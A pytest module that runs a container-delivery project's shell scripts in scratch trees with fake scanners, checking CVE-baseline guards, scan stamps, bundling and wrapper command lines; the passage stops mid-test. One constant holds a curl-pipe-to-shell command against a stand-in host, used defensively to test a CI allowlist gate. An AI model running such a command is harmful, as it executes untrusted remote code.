"""`scripts/*.sh`, executed rather than linted.

Nothing else in this suite runs a shell script. `scripts/lint.sh` reads them --
six gates, four of them shellcheck optional checks -- and `tests/` covers the
Python. So a guard that parses cleanly, passes every gate and then does nothing
at run time is invisible to everything else.

This file is the place for it: a test that runs a script in a tree it owns and
asserts what the script *did*. The two helpers are deliberately not specific to
`lib.sh`. `_tree` copies any scripts you name into `tmp_path`, and `_run`
executes an arbitrary bash snippet there -- `_run(tree, "bash scripts/bundle.sh")`
is as valid as sourcing the library and calling one function.

Copy rather than run in place: `REPO` (`lib.sh`) is derived from `BASH_SOURCE`
and `readonly`, so relocating `lib.sh` is the only way to point the helpers that
read `$REPO/Containerfile` at a Containerfile a test controls. It is also what
makes `_fake_tools` safe. `lib.sh` prepends `$REPO/.tools/bin` to `PATH`, so the
fakes need no PATH manipulation from the test side -- but a checkout's own
`.tools/bin` can be a symlink to a real toolchain, and writing a fake `trivy`
through one destroys it. Every directory these helpers write is under
`tmp_path`.

`scripts/image-scan.sh` and `scripts/bundle.sh` are covered here for the same
reason `lib.sh` is: both carry guards that fire on a proportion or on the
presence of a file, which `shellcheck` cannot evaluate.

No `conftest.gate()`. `bash` is not an optional dependency -- `test_image.py` and
`test_seed_iso.py` already shell out -- and `test_gates.py`'s `KNOWN` is a
closed set of six names, so a gate here would be a skip nothing could ever
demand. Unconditional is what gives these teeth.
"""

from __future__ import annotations

import hashlib
import io
import json
import os
import shlex
import shutil
import subprocess
import tarfile
from pathlib import Path

import pytest

from tests.conftest import REPO

SCRIPTS = REPO / "scripts"

#: Enough of a Containerfile for `containerfile_arg` to parse. Override the
#: version line to drive the guard.
CONTAINERFILE = "FROM scratch\nARG VCOWS_VERSION=9.9.9.9\n"

#: Synthetic CVE ids shaped like the real baseline, exactly 100 of them so a
#: `gone` count reads as a percentage. Synthetic rather than
#: `docs/cve-baseline.json` so the thresholds asserted here do not move when that
#: file is trimmed.
BASELINE_IDS = [f"CVE-2026-{n:05d}" for n in range(100)]

#: The revision label inside the fake docker-archive, and so the tail of the
#: bundle's own filename. Deliberately not the fixture repo's HEAD: the archive
#: being older than the tree is the case `bundle.sh`'s revision check warns
#: about and does not refuse, and the passing test below asserts it is still
#: only a warning.
ARCHIVE_REVISION = "b" * 40

#: The tag stored inside that archive, which is what `podman load` would restore
#: and so what `bundle.sh` must substitute into the wrapper. Deliberately unlike
#: `image_tag`'s output: the archive is the authority, not the Containerfile.
ARCHIVE_TAG = "localhost/vcows-deploy-fixture:9.9.9.9"

#: One fake scanner. `-o PATH` is podman, `--output PATH` is trivy, and
#: `-o spdx-json=PATH` is syft, so `${2#*=}` covers all three.
_FAKE = """#!/usr/bin/env bash
out=""
while [ $# -gt 0 ]; do
    case "$1" in -o|--output) out="${2#*=}"; shift;; esac
    shift
done
%s > "$out"
"""


def _tree(tmp_path: Path, *scripts: str, containerfile: str = CONTAINERFILE) -> Path:
    """A scratch repo root holding `scripts/lib.sh`, any extra scripts, and a
    Containerfile."""
    (tmp_path / "scripts").mkdir()
    for name in ("lib.sh", *scripts):
        shutil.copy(SCRIPTS / name, tmp_path / "scripts" / name)
    (tmp_path / "Containerfile").write_text(containerfile)
    return tmp_path


def _report(tree: Path, found: list[str]) -> None:
    """What the fake trivy will hand back. Rewritable between runs."""
    (tree / "report.json").write_text(
        json.dumps(
            {"Results": [{"Vulnerabilities": [{"VulnerabilityID": i} for i in found]}]}
        )
    )


def _fake_tools(tree: Path, found: list[str]) -> None:
    """podman, trivy and syft in the tree's own `.tools/bin`, reporting `found`.

    `lib.sh` puts that directory first on `PATH`, so this is the script's own
    injection point and the test manipulates nothing. The archive is a stub:
    nothing in `image-scan.sh` reads it, only the two scanners it hands it to.
    """
    _report(tree, found)
    binaries = tree / ".tools" / "bin"
    binaries.mkdir(parents=True)
    payloads = {
        "podman": "printf 'stub docker-archive\\n'",
        "trivy": f"cat '{tree / 'report.json'}'",
        "syft": """printf '{"packages":[{"name":"stub"}]}\\n'""",
    }
    for name, payload in payloads.items():
        (binaries / name).write_text(_FAKE % payload)
        (binaries / name).chmod(0o755)


def _baseline(tree: Path, ids: list[str] = BASELINE_IDS) -> None:
    """`docs/cve-baseline.json` as `image-scan.sh`'s `delta` jq reads it:
    `.accepted` and nothing else."""
    (tree / "docs").mkdir()
    (tree / "docs" / "cve-baseline.json").write_text(json.dumps({"accepted": ids}))


def _stamp_line(archive: Path) -> str:
    """`sha256sum image.tar` output, which is the whole format of the PASSED
    stamp `image-scan.sh` writes and `bundle.sh` refuses to bundle without."""
    return f"{hashlib.sha256(archive.read_bytes()).hexdigest()}  image.tar\n"


def _fake_archive(path: Path, revision: str) -> None:
    """A docker-archive as `archive_label` and `archive_tag` (`bundle.sh`) read one.

    Two JSON members in a tar: `manifest.json` naming the config blob and the
    stored tag, and the blob carrying the two OCI labels the bundle is named
    from. Nothing in `bundle.sh` opens a layer, so 2 KB stands in for the real
    444 MB.
    """
    config = {
        "config": {
            "Labels": {
                "org.opencontainers.image.version": "9.9.9.9",
                "org.opencontainers.image.revision": revision,
            }
        }
    }
    manifest = [{"Config": "config.json", "RepoTags": [ARCHIVE_TAG]}]
    members = {"manifest.json": manifest, "config.json": config}
    with tarfile.open(path, "w") as tar:
        for name, payload in members.items():
            blob = json.dumps(payload).encode()
            info = tarfile.TarInfo(name)
            info.size = len(blob)
            tar.addfile(info, io.BytesIO(blob))


def _bundle_tree(tmp_path: Path, stamp: str | None) -> Path:
    """A tree `bundle.sh` runs to completion in, `stamp` becoming `.cache/scan/PASSED`.

    `None` writes no stamp at all. Past the precondition the script reaches
    `source_revision` (`lib.sh`), which calls `git rev-parse HEAD`; that is not
    what these tests are about, and it stands between the precondition and the
    delivery.
    """
    tree = _tree(tmp_path, "bundle.sh", "vcows.sh")
    # `_tree` copies `scripts/` and nothing else, and `bundle.sh` copies these
    # two out of the repository root into the delivery. The real files, so a
    # rename here fails the bundle rather than passing against a stub.
    for name in ("config.example.yaml", "SITE.md"):
        shutil.copy(REPO / name, tree / name)
    scan = tree / ".cache" / "scan"
    scan.mkdir(parents=True)
    _fake_archive(scan / "image.tar", ARCHIVE_REVISION)
    (scan / "sbom.spdx.json").write_text('{"packages":[]}')
    (scan / "trivy.json").write_text('{"Results":[]}')
    if stamp is not None:
        (scan / "PASSED").write_text(stamp)
    git = ["git", "-C", str(tree), "-c", "user.name=t", "-c", "user.email=t@t"]
    subprocess.run([*git, "init", "-q"], check=True)
    subprocess.run([*git, "add", "-A"], check=True)
    subprocess.run([*git, "commit", "-qm", "fixture"], check=True)
    return tree


def _run(tree: Path, script: str, **env: str) -> subprocess.CompletedProcess:
    """Run `script` under bash in `tree`, with `scripts/lib.sh` already sourced.

    Every `VCOWS_*` variable is dropped from the child environment and put back
    only if a test asks for it. The tree is the fixture, and an ambient override
    must not decide the outcome: `image_tag` returns `$VCOWS_IMAGE_TAG` verbatim
    when it is set (`lib.sh`), so without this the two tests below pass under
    `just test` and fail under `just test-image`.
    """
    clean = {k: v for k, v in os.environ.items() if not k.startswith("VCOWS_")}
    return subprocess.run(
        ["bash", "-c", f"source '{tree}/scripts/lib.sh'\n{script}"],
        capture_output=True,
        text=True,
        cwd=tree,
        env=clean | env,
        check=False,
    )


def test_a_guard_two_levels_inside_a_substitution_stops_the_caller(tmp_path):
    """`image_tag` -> `containerfile_arg` -> `die`, called as `x="$(image_tag)"`.

    That is the shape of `image-build.sh`, `image-scan.sh` and `test-image.sh`,
    each assigning `image_tag` inside a substitution, and of
    `install-tools.sh`'s `fetch` -> `digest`. Without
    `shopt -s inherit_errexit` (`lib.sh`) the `die` exits only the innermost
    subshell, `image_tag` returns `localhost/vcows-deploy:` at status
    0, and the builder is invoked with an empty tag.
    """
    tree = _tree(tmp_path, containerfile="FROM scratch\nARG VCOWS_VERSION=\n")
    done = _run(tree, 'tag="$(image_tag)"\necho "REACHED tag=[$tag]"')
    assert "no 'ARG VCOWS_VERSION=' in Containerfile" in done.stderr
    assert done.returncode != 0, f"the die did not stop the caller: {done.stdout!r}"
    assert "REACHED" not in done.stdout


def test_the_same_call_succeeds_when_the_arg_is_present(tmp_path):
    """The vacuity guard: the test above must fail for the guard, not the harness."""
    tree = _tree(tmp_path)
    done = _run(tree, 'tag="$(image_tag)"\necho "REACHED tag=[$tag]"')
    assert done.returncode == 0, done.stderr
    assert done.stdout.strip() == "REACHED tag=[localhost/vcows-deploy:9.9.9.9]"


#: `gone` of the 100, and whether the scan must refuse it. The middle pair is the
#: threshold's own boundary. The outer three are measured: 1 is what a real scan
#: of this image reports, 45 is an emptied `gobinary` analyser, 56 an emptied
#: `os-pkgs` one.
GONE_ROWS = [(1, False), (33, False), (34, True), (45, True), (56, True)]


@pytest.mark.parametrize(("gone", "red"), GONE_ROWS)
def test_a_scan_missing_a_third_of_the_baseline_is_not_clean(tmp_path, gone, red):
    """`image-scan.sh`'s missing-ids guard on a 100-id baseline, at five points
    of the curve.

    Do not test `missing -eq accepted`: that fires only at a total loss, which
    `scan_floor` already refuses. The losses this guard exists to catch are
    partial and large, because trivy's three `Results` split into two disjoint
    analyser families: 55 ids on the rocky layer and 44 across the two Go
    binaries. `gone=45` decides the threshold -- `missing * 2 -gt accepted` first
    fires at 51 and leaves that row green, `* 3` fires at 34 and turns it red.
    """
    tree = _tree(tmp_path, "image-scan.sh")
    _baseline(tree)
    _fake_tools(tree, BASELINE_IDS[: 100 - gone])
    done = _run(tree, "bash scripts/image-scan.sh")
    if red:
        assert done.returncode == 1, done.stderr
        assert f"{gone} of 100 accepted findings are absent" in done.stderr
        assert "did not read this image" in done.stderr
    else:
        assert done.returncode == 0, done.stderr
        assert f"baseline entries no longer found ({gone} of 100" in done.stderr
        assert "no findings outside the baseline" in done.stderr


def test_the_scan_stamps_a_pass_and_takes_the_stamp_back_on_a_failure(tmp_path):
    """`image-scan.sh`'s `rm -f "$out/PASSED"` and the `sha256sum` that writes it,
    the two halves of the verdict.

    An exit status does not survive the process, so the verdict is a file. Both
    halves matter: a run that dies has to remove a stamp an earlier run left, or
    `bundle.sh` reads yesterday's verdict about today's archive.
    """
    tree = _tree(tmp_path, "image-scan.sh")
    _baseline(tree)
    _fake_tools(tree, BASELINE_IDS)
    scan = tree / ".cache" / "scan"

    assert _run(tree, "bash scripts/image-scan.sh").returncode == 0
    assert (scan / "PASSED").read_text() == _stamp_line(scan / "image.tar")

    _report(tree, [*BASELINE_IDS, "CVE-2099-99999"])
    done = _run(tree, "bash scripts/image-scan.sh")
    assert done.returncode == 1, done.stderr
    assert "1 new finding(s)" in done.stderr
    assert not (scan / "PASSED").exists(), "a failed scan left its verdict behind"


def test_bundle_refuses_an_archive_no_scan_has_accepted(tmp_path):
    """Three complete files and no verdict must not be enough to ship.

    A scan that dies on a new finding writes the archive, the report and the SBOM
    before it reads the baseline, so a three-file precondition sees exactly what
    a passing scan leaves and assembles a correctly named, checksum-verifying
    delivery for an image the CVE gate rejected.
    """
    tree = _bundle_tree(tmp_path, stamp=None)
    done = _run(tree, "bash scripts/bundle.sh")
    assert done.returncode == 1, done.stderr
    assert "has not accepted this archive" in done.stderr
    assert not (tree / ".cache" / "delivery").exists()


def test_bundle_refuses_a_stamp_that_describes_a_different_archive(tmp_path):
    """Why the stamp holds a digest rather than being empty.

    A second scan that rewrites `image.tar` and then dies, or an archive copied
    in by hand, leaves a stamp that vouches for bytes that are no longer there.
    An empty marker would be about four lines lighter and could not tell the two
    apart; the digest costs 2.0s over the real 444 MB.
    """
    tree = _bundle_tree(tmp_path, stamp=f"{'0' * 64}  image.tar\n")
    done = _run(tree, "bash scripts/bundle.sh")
    assert done.returncode == 1, done.stderr
    assert "does not describe image.tar" in done.stderr
    assert not (tree / ".cache" / "delivery").exists()


def test_bundle_proceeds_when_the_stamp_matches(tmp_path):
    """The regression guard: a precondition that also refuses valid input is
    worse than none.

    Also pins the severity split. The archive's revision is not the fixture's
    HEAD, so `bundle.sh`'s revision warning fires -- and must stay a warning,
    because delivering an older image on purpose is legitimate where shipping
    an unaccepted one is not.
    """
    tree = _bundle_tree(tmp_path, stamp=None)
    scan = tree / ".cache" / "scan"
    (scan / "PASSED").write_text(_stamp_line(scan / "image.tar"))
    done = _run(tree, "bash scripts/bundle.sh")
    assert done.returncode == 0, done.stderr
    assert "warning: the archive was built at" in done.stderr
    delivery = tree / ".cache" / "delivery"
    assert sorted(p.name for p in delivery.iterdir()) == [
        "SHA256SUMS",
        "SITE.md",
        "config.example.yaml",
        "image.tar.sha256",
        "sbom.spdx.json",
        "trivy.json",
        f"vcows-deploy-9.9.9.9-{ARCHIVE_REVISION}.tar.gz",
        "vcows.sh",
    ]


def test_the_bundled_wrapper_names_the_tag_the_archive_stores(tmp_path):
    """`podman load` restores the tag recorded in the archive, so that is the one
    the wrapper has to name -- not the one `image_tag` computes from the
    Containerfile, which a worktree suffix or a later edit can move away from it.

    Executable and in SHA256SUMS for the same reason the tarball is: a site runs
    `sha256sum -c` before it runs anything, and a wrapper outside that list is
    the one file in the bundle nothing vouches for.
    """
    tree = _bundle_tree(tmp_path, stamp=None)
    scan = tree / ".cache" / "scan"
    (scan / "PASSED").write_text(_stamp_line(scan / "image.tar"))
    assert _run(tree, "bash scripts/bundle.sh").returncode == 0

    wrapper = tree / ".cache" / "delivery" / "vcows.sh"
    assert f'IMAGE="{ARCHIVE_TAG}"' in wrapper.read_text()
    assert PLACEHOLDER not in wrapper.read_text()
    assert wrapper.stat().st_mode & 0o111, "not executable"
    assert "vcows.sh" in (tree / ".cache" / "delivery" / "SHA256SUMS").read_text()


# --- scripts/lint.sh: workflows carry no logic ------------------------------
#
# A YAML sequence alias splices a *list* into a list, so `- *bootstrap` under
# `script:` parses to `[[...three commands...], "just check"]`. A `lines()` that
# matches only `isinstance(item, str)` drops the whole anchor with no diagnostic
# -- the shape all four `.gitlab-ci.yml` jobs use, so the gate would be blind to
# hostile content in every anchored job and say nothing. This is the guard on
# any edit to `lines()`.

#: A command `lint.sh`'s `ok` allowlist must reject. Written as a chain because
#: that is the case its "the whole command, not its prefix" comment gives for
#: `fullmatch` over `match`:
#: a prefix test passes `just check && curl evil.sh | sh`.
HOSTILE = "just check && curl evil.sh | sh"


def _workflow_tree(tmp_path: Path, *, github: dict[str, str], gitlab: str = "") -> Path:
    """A scratch repo whose only interesting content is its workflow files.

    `lint.sh` is copied rather than run in place for the reason the module
    docstring gives: `REPO` is derived from `BASH_SOURCE` and `readonly`, so
    relocating the script is the only way to point the gate at workflows a test
    controls.

    `.venv` is a symlink rather than a build. `lint.sh`'s `main` calls
    `need_venv` and the gate's body runs under `$PY` (`lib.sh`), which needs
    PyYAML; creating a second venv per test would cost more than the whole file.
    The link is read, never written -- every path these tests write is under
    `tmp_path`.
    """
    tree = _tree(tmp_path, "lint.sh")
    (tree / ".venv").symlink_to(REPO / ".venv")
    workflows = tree / ".github" / "workflows"
    workflows.mkdir(parents=True)
    for name, text in github.items():
        (workflows / name).write_text(text)
    if gitlab:
        (tree / ".gitlab-ci.yml").write_text(gitlab)
    return tree


def _gate_verdict(tree: Path) -> tuple[bool, str]:
    """Run this one gate, and report its exit status and its diagnostic.

    Source `lint.sh` and call the function, rather than running the script. A
    full run costs the other five gates -- ruff, ruff format, hadolint,
    shellcheck and gitleaks over the fixture tree -- on every row, and they fail
    against a tree that is not a checkout, where `shellcheck` is handed the
    unexpanded `$REPO/.claude/hooks/*.sh` glob. With nothing else running, the
    status is the verdict.

    The sourcing needs a shell of its own. `_run` has already sourced `lib.sh`,
    `lint.sh` sources it again by its own `BASH_SOURCE` path, and `readonly REPO`
    makes that second assignment fatal under `set -e`.
    """
    done = _run(tree, "bash -c 'source scripts/lint.sh; workflows_carry_no_logic'")
    return done.returncode == 0, done.stderr


#: `(id, github files, gitlab file, must_pass)`. Every hostile shape is paired
#: with the benign twin of the same shape, so a case cannot pass because the
#: fixture never reached the gate.
#:
#: The GitLab documents are written as anchors: a `.gitlab-ci.yml` that does not
#: use one exercises nothing this file is here for.
_ANCHORED = """\
.bootstrap: &bootstrap
  - ./scripts/os-deps.sh
  - %s
check:
  script: [*bootstrap, just check]
"""
_RUN = "a:\n  steps: [{run: %s}]\n"
_USES = "a:\n  steps: [{uses: %s}]\n"
_SCRIPT = "a:\n  script: %s\n"
_MINIMAL = _RUN % "just check"
_DIGEST = "actions/checkout@" + "a" * 40

GATE_ROWS = [
    # A list spliced into a list under `script:`.
    pytest.param({"ci.yml": _MINIMAL}, _ANCHORED % HOSTILE, False, id="anchored-list"),
    pytest.param(
        {"ci.yml": _MINIMAL},
        _ANCHORED % "just dev-env",
        True,
        id="anchored-list-benign",
    ),
    # A plain string under `run:`, which the walk reaches directly. This is the
    # `fullmatch`-not-`match` property: the chain starts with `just check`.
    pytest.param({"ci.yml": _RUN % HOSTILE}, "", False, id="bare-string"),
    pytest.param({"ci.yml": _MINIMAL}, "", True, id="bare-string-benign"),
    # A list inside a list, reached only by `lines()` recursing on itself.
    pytest.param(
        {"ci.yml": _MINIMAL}, _SCRIPT % f"[[{HOSTILE}]]", False, id="nested-list"
    ),
    pytest.param(
        {"ci.yml": _MINIMAL}, _SCRIPT % "[[just check]]", True, id="nested-list-benign"
    ),
    # `uses:`, the second allowlist. A tag ref is what the pin exists to refuse.
    pytest.param(
        {"ci.yml": _USES % "actions/checkout@v7"}, "", False, id="mutable-tag"
    ),
    pytest.param({"ci.yml": _USES % _DIGEST}, "", True, id="digest-pin"),
    # `workflows_carry_no_logic`'s own reason for globbing both extensions:
    # reading only one "fails open on a file it was written to cover". The file
    # discovery is the gate's, not YAML's.
    pytest.param({"ci.yaml": _RUN % HOSTILE}, "", False, id="yaml-extension"),
]


@pytest.mark.parametrize(("github", "gitlab", "must_pass"), GATE_ROWS)
def test_the_workflow_gate_reaches_every_shape_a_command_can_take(
    tmp_path, github, gitlab, must_pass
):
    """`workflows_carry_no_logic` against one hostile command written nine ways.

    The failing rows assert the diagnostic *names* the command as well. A gate
    that fails without saying which line it objected to is indistinguishable
    from a walk that returned nothing: both silences look identical from
    outside.
    """
    tree = _workflow_tree(tmp_path, github=github, gitlab=gitlab)
    passed, stderr = _gate_verdict(tree)
    assert passed is must_pass, stderr
    if not must_pass:
        assert HOSTILE in stderr or "actions/checkout@v7" in stderr, stderr


#: One row per shape `need`'s table can be asked about: a hit on each installer,
#: the tool `lib.sh` names as deliberately absent, one that is passed to `need`
#: today and is in neither installer, and one nothing has heard of. The last
#: three must name no script -- pointing at `os-deps.sh` for something it does
#: not install is worse than the bare message.
NEED_ROWS = [
    pytest.param("curl", "curl not on PATH -- run scripts/os-deps.sh", id="os-deps"),
    pytest.param(
        "trivy",
        "trivy not on PATH -- run scripts/install-tools.sh",
        id="install-tools",
    ),
    pytest.param("gzip", "gzip not on PATH", id="assumed-present"),
    pytest.param("qemu-img", "qemu-img not on PATH", id="neither-installer"),
    pytest.param("nosuchtool", "nosuchtool not on PATH", id="unheard-of"),
]


@pytest.mark.parametrize(("tool", "message"), NEED_ROWS)
def test_need_names_the_installer_that_provides_the_missing_tool(
    tmp_path, tool, message
):
    """`need` against an empty PATH, which is how a tool is made absent here.

    An entry whose hint is wrong is worse than no entry, and nothing else would
    say: every call site reaches `need` only when the tool is missing, which on
    a developer box and in CI is never.
    """
    tree = _tree(tmp_path)
    empty = tree / "emptybin"
    empty.mkdir()
    done = _run(tree, f'PATH="{empty}"\nneed {tool}\necho REACHED')
    assert done.returncode != 0, done.stdout
    assert "REACHED" not in done.stdout
    assert message in done.stderr
    if "run scripts/" not in message:
        assert "run scripts/" not in done.stderr, done.stderr


#: The five `install-tools.sh` walks, in `main`'s order. `syft` is last, which is
#: what makes it the marker for "the run got past the tool under test".
PINNED_TOOLS = ("uv", "just", "hadolint", "trivy", "syft")


def _tools_tree(tmp_path: Path, **bodies: str) -> Path:
    """A scratch root where all five pinned tools are already on PATH.

    On PATH but *not* in `.tools/bin`: `installed` is tested before `have`, so a
    fake in `.tools/bin` returns at "already in .tools/bin" and never reaches
    `version_of`. `expose_on_path` then finds that directory empty and links
    nothing, so nothing here touches /usr/local/bin or reaches for sudo.

    Every tool prints a dotted version unless `bodies` overrides it, so one test
    can make one tool misbehave and read the other four as the control.
    """
    tree = _tree(tmp_path, "install-tools.sh")
    fakebin = tree / "fakebin"
    fakebin.mkdir()
    for tool in PINNED_TOOLS:
        body = bodies.get(tool, f"echo '{tool} 9.9.9'")
        (fakebin / tool).write_text(f"#!/usr/bin/env bash\n{body}\n")
        (fakebin / tool).chmod(0o755)
    return tree


def _install_tools(tree: Path) -> subprocess.CompletedProcess:
    """`install-tools.sh` end to end. Nothing is downloaded: every tool is
    already on PATH, so each one takes the early return."""
    return _run(
        tree,
        "bash scripts/install-tools.sh",
        PATH=f"{tree / 'fakebin'}:{os.environ['PATH']}",
    )


def test_a_path_tool_reports_the_version_it_prints(tmp_path):
    """The vacuity guard for the two below: the harness reaches the report."""
    tree = _tools_tree(tmp_path)
    done = _install_tools(tree)
    assert done.returncode == 0, done.stderr
    assert f"trivy: using {tree / 'fakebin' / 'trivy'} (9.9.9)" in done.stderr


def test_a_path_tool_with_no_dotted_version_is_reported_rather_than_silent(tmp_path):
    """A `grep -oE` in `version_of` that matches nothing makes the whole pipeline
    status 1 under `pipefail`, and `set -e` then aborts `install_one` before its
    own log line -- so `${found:-version unknown}`, written for exactly this
    tool, never fires and `install-tools.sh` fails saying nothing."""
    tree = _tools_tree(tmp_path, trivy="echo 'trivy, build 2026-08-31'")
    done = _install_tools(tree)
    assert done.returncode == 0, done.stderr
    assert f"trivy: using {tree / 'fakebin' / 'trivy'} (version unknown)" in done.stderr
    assert "trivy of unknown version is on PATH" in done.stderr
    assert "syft: using" in done.stderr, "the run stopped at trivy"


def test_a_path_tool_that_will_not_run_is_named_rather_than_read_as_unknown(tmp_path):
    """Why `|| true` on the assignment is not the fix: a tool that cannot be run
    is not a tool of unknown version, and the two must not print the same line.
    This one still stops the run, but says why."""
    tree = _tools_tree(tmp_path, trivy="exit 3")
    done = _install_tools(tree)
    assert done.returncode != 0, done.stderr
    assert "trivy --version' failed" in done.stderr
    assert str(tree / "fakebin" / "trivy") in done.stderr
    assert "syft: using" not in done.stderr


# --- scripts/vcows.sh: the wrapper a site runs ------------------------------
#
# The wrapper's whole contract is the `podman run` command line it builds, and
# `shellcheck` reads none of that -- the blind spot the module docstring
# describes. A fake `podman` that records its argv turns the contract into an
# assertion.
#
# It is also the one script here that sources nothing, so `_run`'s `lib.sh` is
# doing only one thing for these tests: putting the tree's own `.tools/bin`
# first on PATH, which is where the fake goes.

#: The unsubstituted placeholder. Run out of `scripts/` the wrapper names this
#: literally; `bundle.sh` replaces it with the tag stored in image.tar, which
#: the bundle test below asserts separately. The two halves have to be
#: independent or a broken substitution passes both.
PLACEHOLDER = "@IMAGE@"


def _wrapper_tree(tmp_path: Path, config: bool = True) -> Path:
    """`vcows.sh` in a tree whose `podman` writes down what it was called with."""
    tree = _tree(tmp_path, "vcows.sh")
    binaries = tree / ".tools" / "bin"
    binaries.mkdir(parents=True)
    podman = binaries / "podman"
    podman.write_text(
        f"#!/usr/bin/env bash\nprintf '%s\\n' \"$@\" > '{tree}/podman.argv'\n"
    )
    podman.chmod(0o755)
    if config:
        (tree / "config.yaml").write_text("schema_version: 1\n")
    return tree


def _wrapper(
    tree: Path, *args: str, **env: str
) -> tuple[subprocess.CompletedProcess, list[str]]:
    """Run the wrapper; report what podman got, `[]` meaning it was never run.

    `< /dev/null` fixes the one input these tests cannot otherwise control:
    `[ -t 0 ]` decides whether `destroy` gets `-it`, and pytest's own stdin is a
    terminal or not depending on how the suite was invoked.
    """
    argv = " ".join(shlex.quote(a) for a in args)
    done = _run(tree, f"bash scripts/vcows.sh {argv} < /dev/null", **env)
    recorded = tree / "podman.argv"
    return done, recorded.read_text().splitlines() if recorded.exists() else []


def _expected(tree: Path, verb: str, *, images=False, runs=False, yes=False, opts=()):
    """The command line each verb is supposed to build, in order."""
    argv = ["run", "--rm", *opts, "-v", f"{tree}/config.yaml:/config.yaml:ro,z"]
    if images:
        argv += ["-v", f"{tree}/images:/images:ro,z"]
    if runs:
        argv += ["-v", f"{tree}/runs:/runs:Z"]
    argv += [PLACEHOLDER, verb, "/config.yaml"]
    if yes:
        argv.append("--yes")
    return argv


#: One row per verb, plus `destroy -y`. The labels are the assertion as much as
#: the paths are: `:Z` relabels the host path into a category private to one
#: container, which is right for `runs/` and would take a shared golden-image
#: directory away from everything else on the host.
WRAPPER_ROWS = [
    pytest.param(("validate",), {"images": True}, id="validate"),
    pytest.param(("preflight",), {"images": True, "runs": True}, id="preflight"),
    pytest.param(("deploy",), {"images": True, "runs": True}, id="deploy"),
    pytest.param(("destroy",), {"images": True, "runs": True}, id="destroy"),
    pytest.param(
        ("destroy", "-y"), {"images": True, "runs": True, "yes": True}, id="destroy-yes"
    ),
]


@pytest.mark.parametrize(("args", "mounts"), WRAPPER_ROWS)
def test_each_verb_mounts_what_it_needs_and_nothing_else(tmp_path, args, mounts):
    """Images are mounted for every verb, read-only: `validate` checks `disk_gb`
    against the image offline and `destroy` runs the same checks before the
    teardown -- measured at a site, without the mount both warn that a file
    sitting in `./images` cannot be read. The run directory is for the three
    verbs that write a record; `validate` writes nothing.

    Asserted as the whole argv rather than as membership: an extra mount, a
    dropped `--rm` or an `-it` on a non-terminal are all invisible to a test
    that only asks whether something is present.
    """
    tree = _wrapper_tree(tmp_path)
    done, argv = _wrapper(tree, *args)
    assert done.returncode == 0, done.stderr
    assert argv == _expected(tree, args[0], **mounts)


def test_a_relative_path_reaches_podman_absolute(tmp_path):
    """podman reads a relative `-v` source as a *named volume*, not as a path.
    Unresolved, `-c sub/config.yaml` would mount an empty volume over
    /config.yaml and the run would fail on a config the site can see is there."""
    tree = _wrapper_tree(tmp_path)
    (tree / "sub").mkdir()
    shutil.move(tree / "config.yaml", tree / "sub" / "config.yaml")
    done, argv = _wrapper(tree, "validate", "-c", "sub/config.yaml")
    assert done.returncode == 0, done.stderr
    assert f"{tree}/sub/config.yaml:/config.yaml:ro,z" in argv


def test_the_two_directories_are_made_when_they_are_not_there(tmp_path):
    """A site's first `deploy` has neither. Refusing until two empty directories
    exist is the step that gets skipped, so the wrapper makes them."""
    tree = _wrapper_tree(tmp_path)
    done, argv = _wrapper(tree, "deploy")
    assert done.returncode == 0, done.stderr
    assert (tree / "images").is_dir()
    assert (tree / "runs").is_dir()
    assert argv, "podman was never reached"


#: `(args, the path named, the flag named)`. No mode cases: these run as root in
#: CI, where 0000 is readable, and `conftest.gate()`'s names are a closed set --
#: so a root-skip would mean a new gate for one assertion.
PATH_FAILURES = [
    pytest.param(
        ("validate", "-c", "missing.yaml"), "missing.yaml", "--config", id="config"
    ),
    pytest.param(
        ("deploy", "-i", "blocker/images"), "blocker/images", "--images", id="images"
    ),
    pytest.param(("deploy", "-r", "blocker"), "blocker", "--runs", id="runs"),
]


@pytest.mark.parametrize(("args", "path", "flag"), PATH_FAILURES)
def test_a_path_that_will_not_work_is_named_before_podman_runs(
    tmp_path, args, path, flag
):
    """Named with its flag, because the operator's next move is to edit one of
    three, and podman's own error names a mount source and no flag at all.

    Reached before podman, because the alternative is a container that starts,
    relabels one path and dies on the next.
    """
    tree = _wrapper_tree(tmp_path)
    (tree / "blocker").write_text("not a directory")
    done, argv = _wrapper(tree, *args)
    assert done.returncode == 1, done.stdout
    assert path in done.stderr
    assert flag in done.stderr
    assert argv == [], "podman ran anyway"


def test_install_refuses_a_directory_holding_two_bundles(tmp_path):
    """Two deliveries unpacked into one directory. Loading whichever the glob
    sorted first is a site running an image nobody chose."""
    tree = _wrapper_tree(tmp_path, config=False)
    beside = tree / "scripts"
    names = ("vcows-deploy-9.9.9.9-a.tar.gz", "vcows-deploy-9.9.9.9-b.tar.gz")
    empty = hashlib.sha256(b"").hexdigest()
    for name in names:
        (beside / name).write_bytes(b"")
    (beside / "SHA256SUMS").write_text("".join(f"{empty}  {n}\n" for n in names))
    done, argv = _wrapper(tree, "install")
    assert done.returncode == 1, done.stdout
    assert "exactly one" in done.stderr
    assert argv == [], "podman ran anyway"


def test_version_needs_neither_a_config_nor_a_mount(tmp_path):
    """It reports what is inside the image, so there is nothing of the site's for
    it to read -- and a site that has run `install` and nothing else has no
    config for the wrapper to insist on.

    Carries `VCOWS_LOG_LEVEL` all the same: the usage text promises "every
    VCOWS_* variable set here is forwarded", and a `version` arm that runs its
    own `podman run --rm` ahead of the forwarding loop makes that false for one
    verb.
    """
    tree = _wrapper_tree(tmp_path, config=False)
    done, argv = _wrapper(tree, "version", VCOWS_LOG_LEVEL="DEBUG")
    assert done.returncode == 0, done.stderr
    assert argv == ["run", "--rm", "-e", "VCOWS_LOG_LEVEL", PLACEHOLDER, "version"]


def test_a_vcows_variable_set_beside_the_wrapper_reaches_the_container(tmp_path):
    """`VCOWS_LOG_LEVEL` and the `VCOWS_MAX_*` ceilings are read from the
    container's environment, and the wrapper is the only thing between the
    operator's shell and it.

    `-e NAME` without a value: podman copies it. Asserted as the whole argv,
    which is safe because `_run` drops every ambient `VCOWS_*` -- so this is the
    one variable in the child's environment, and a second `-e` would be a
    variable the test did not set.
    """
    tree = _wrapper_tree(tmp_path)
    done, argv = _wrapper(tree, "validate", VCOWS_LOG_LEVEL="DEBUG")
    assert done.returncode == 0, done.stderr
    assert argv == _expected(
        tree, "validate", images=True, opts=["-e", "VCOWS_LOG_LEVEL"]
    )


def test_everything_after_a_bare_dash_dash_is_podman_s(tmp_path):
    """`--userns=keep-id:uid=4242,gid=0` is the remedy README prescribes for a
    run directory owned by the wrong UID, and the wrapper has to pass it
    through. The flags land before the image, the only place podman reads
    them."""
    tree = _wrapper_tree(tmp_path)
